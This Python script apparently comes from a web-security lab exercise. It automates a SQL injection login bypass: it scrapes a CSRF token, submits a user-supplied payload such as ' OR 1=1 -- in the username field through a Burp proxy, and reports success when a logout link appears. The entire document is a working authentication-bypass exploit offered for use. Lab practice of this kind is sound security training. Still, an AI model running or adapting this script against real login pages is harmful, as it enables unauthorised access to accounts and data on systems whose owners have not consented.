import requests
import re
from bs4 import BeautifulSoup
import sys
import urllib3

# Configure your Burp proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def getCSRFToken(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit(s, url, payload):
    csrf = getCSRFToken(s, url)
    data = {
        'csrf': csrf,
        'name': payload,
        'password': 'doesnt really matter'
    }

    r = s.post(url, data=data, verify=False, proxies=proxies)
    if "Log out" in r.text:
        return True
    else:
        return False  # Explicit return

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except:
        print("[-] Syntax Error, Format : %s <url> <payload>" % sys.argv[0])
        print("Example : SQL_1.py http://example.com/login ' OR 1=1 --")
        sys.exit(1)

    s = requests.Session()
    s.verify = False
    s.proxies = proxies

    if exploit(s, url, payload):
        print("[+] Exploit Success")
    else:
        print("[-] Exploit Failed")
